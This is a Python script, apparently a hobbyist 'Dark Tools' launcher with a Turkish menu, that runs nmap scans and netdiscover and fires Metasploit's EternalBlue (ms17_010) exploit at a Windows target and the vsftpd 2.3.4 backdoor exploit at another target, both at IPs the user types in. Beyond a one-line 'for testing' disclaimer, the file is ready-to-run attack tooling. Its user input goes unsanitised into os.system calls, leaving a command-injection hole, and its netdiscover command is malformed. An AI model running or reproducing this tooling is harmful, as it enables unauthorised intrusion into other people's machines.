import sys
import os
import subprocess

subprocess.run('clear', shell=True)

def menu():

    subprocess.run('clear', shell=True)
    
    print('''
    
      :::::::::      :::     :::::::::  :::    :::      ::::::::::: ::::::::   ::::::::  :::        :::::::: 
     :+:    :+:   :+: :+:   :+:    :+: :+:   :+:           :+:    :+:    :+: :+:    :+: :+:       :+:    :+: 
    +:+    +:+  +:+   +:+  +:+    +:+ +:+  +:+            +:+    +:+    +:+ +:+    +:+ +:+       +:+         
   +#+    +:+ +#++:++#++: +#++:++#:  +#++:++             +#+    +#+    +:+ +#+    +:+ +#+       +#++:++#++   
  +#+    +#+ +#+     +#+ +#+    +#+ +#+  +#+            +#+    +#+    +#+ +#+    +#+ +#+              +#+    
 #+#    #+# #+#     #+# #+#    #+# #+#   #+#           #+#    #+#    #+# #+#    #+# #+#       #+#    #+#     
#########  ###     ### ###    ### ###    ###          ###     ########   ########  ########## ########       
                                                        
 ''')
    
    print('+[+[+[ Önemli Bilgilendirme Tüm bilgi ve programlar tamamen test amaçlı oluşturulmaktadır. Yasal herhangi bir sorumluluk kullanan kişi ya da kuruma aittir. Important Warning All information and programs created for testing. Illegal usings are belong to user or coroprations ]+]+]+')
         
    print("Seçiminizi Yapınız:")
    print("1. Port Tarama")
    print("2. Windows Saldırısı")
    print("3. Metasploitable Saldırısı")
    print("4. Ağda Bulunan Ipleri Tarama(Netdiscover)")
    print("5. Çıkış")
    
    choice = input("Seçiminizi Yazınız:")
    
    if choice == "1":
        option1()
    elif choice == "2":
        option2()
    elif choice == "3":
        option3()
    elif choice == "4":
        option4()          
    elif choice == "5":
        print("Programdan Çıkılıyor...")
        exit()
    else:
        print("Yanlış Seçenek. LÜtfen Tekrar Deneyiniz.")
        menu()

def option1():
      print("1. Seçenek Seçildi")

      print("""
     1) Hızlı Port Tarama
     2) Servis ve Versiyon Bilgisi
     3) Işletim Sistemi Bilgisi
     4) Menü
     """)
     
      islemno=input("İşlem Numarası Giriniz>:")

      if islemno=="1":
        hedefip=input("Hedef Ip Giriniz>:")
        os.system("nmap "+hedefip)
      elif islemno=="2":
        hedefip=input("Hedef Ip Giriniz>:")
        os.system("nmap -sS -sV "+hedefip)
      elif islemno=="3":
        hedefip=input("Hedef Ip Giriniz>:")
        os.system("nmap -O "+hedefip)
      elif islemno== "4":
        menu()
      else:
         print("Yanlış Tuşa Bastınız...")
         
      back_to_menu()

def option2():
       print("2. Seçenek Seçildi")
    
       print("""
       1) Saldırı Başlat
       2) Menü
                  """)
    
       ipno=input("işlem Numarası Giriniz>:")
     
       if ipno== "1":
         target=input("\nHedef İp Adresini Giriniz>:")
         os.system("msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set target 0; set rhosts {}; exploit\"".format (target))
        
       if ipno=="2":
           menu() 
        
       if os.system("exit") == os.system("exit"):
         back_to_menu()
         
def option3():
      
       print("2. Seçenek Seçildi")
    
       print("""
       1) Saldırı Başlat
       2) Menü
                  """)
    
       ipno=input("işlem Numarası Giriniz>:")
     
       if ipno== "1":
         target=input("\nHedef İp Adresini Giriniz>:")
         os.system("msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set target 0; set rhosts {}; exploit\"".format (target))
         
       if ipno== "2":
          menu()
         
       if os.system("exit") == os.system("exit"):
         back_to_menu()
          

def option4():

    print(""" 
    Ağ İçi Ip Tarayıcısına Hoş Geldiniz !
    """)
    
    print("""
       1) Tarama Başlat
       2) Menü
                  """)
    ip=input("İşlem Numarası Giriniz:")
    
    if ip=="1":
       scan=input("\nTaranacak İp Adresini Giriniz>(192.168.x.x):")
       os.system("netdiscover{}/24".format(scan)) 
       
    if ip=="2":
       menu()    

def back_to_menu():
    input("Enter'a Basarak Ana Menüye Dönün.")
    menu()

menu()
